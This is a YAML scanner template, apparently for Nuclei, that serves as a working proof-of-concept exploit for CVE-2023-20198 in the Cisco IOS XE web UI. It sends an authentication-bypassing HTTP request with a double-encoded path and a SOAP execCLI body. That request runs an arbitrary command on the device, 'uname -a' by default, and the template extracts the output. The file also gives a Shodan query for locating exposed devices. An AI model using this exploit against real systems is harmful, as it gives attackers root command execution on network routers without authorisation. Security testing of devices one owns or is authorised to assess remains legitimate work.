attack/01-enterprise/02-initial-access/cves/CVE-2023-20198.yaml

id: CVE-2023-20198

info:
  name: Cisco IOS XE RCE via SOAP (CVE-2023-20198) - Custom PoC
  author: dhexter
  severity: critical
  description: |
    A vulnerability in the web UI component of Cisco IOS XE Software could allow an unauthenticated, remote attacker to execute arbitrary commands with root privileges on the underlying operating system. This vulnerability is due to improper input validation in the web UI. An attacker could exploit this vulnerability by sending crafted HTTP requests to an affected device. A successful exploit could allow the attacker to execute arbitrary commands with root privileges on the underlying operating system.
  reference:
    - https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/
    - https://www.rapid7.com/blog/post/2023/10/16/etr-cisco-ios-xe-web-ui-cve-2023-20198-active-exploitation/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-20198
    epss-score: 0.94035
    epss-percentile: 0.99886
  metadata:
    max-request: 1
    verified: true
    vendor: cisco
    product: ios_xe
    shodan-query: http.html_hash:1076109428
  tags: cve,cve2023,cisco,rce,router,iot,network,kev

variables:
  cmd: 'uname -a'

http:
  - raw:
      - |
        POST /%2577eb%2575i_%2577sma_Http HTTP/1.1
        Host: {{Hostname}}
        User-Agent: CVE-2023-20198-PoC
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        <?xml version="1.0"?>
        <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/"
                       xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
                       xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <SOAP:Header>
            <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
              <wsse:UsernameToken SOAP:mustUnderstand="false">
                <wsse:Username>admin</wsse:Username>
                <wsse:Password>*****</wsse:Password>
              </wsse:UsernameToken>
            </wsse:Security>
          </SOAP:Header>
          <SOAP:Body>
            <request correlator="exec1" xmlns="urn:cisco:wsma-exec">
              <execCLI xsd="false">
                <cmd>{{cmd}}</cmd>
                <dialogue>
                  <expect></expect>
                  <reply></reply>
                </dialogue>
              </execCLI>
            </request>
          </SOAP:Body>
        </SOAP:Envelope>

    matchers:
      - type: word
        part: body
        words:
          - "<received>"
          - "<text>"
        condition: and

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - "<text>([\\s\\S]*?)</text>"

    stop-at-first-match: true
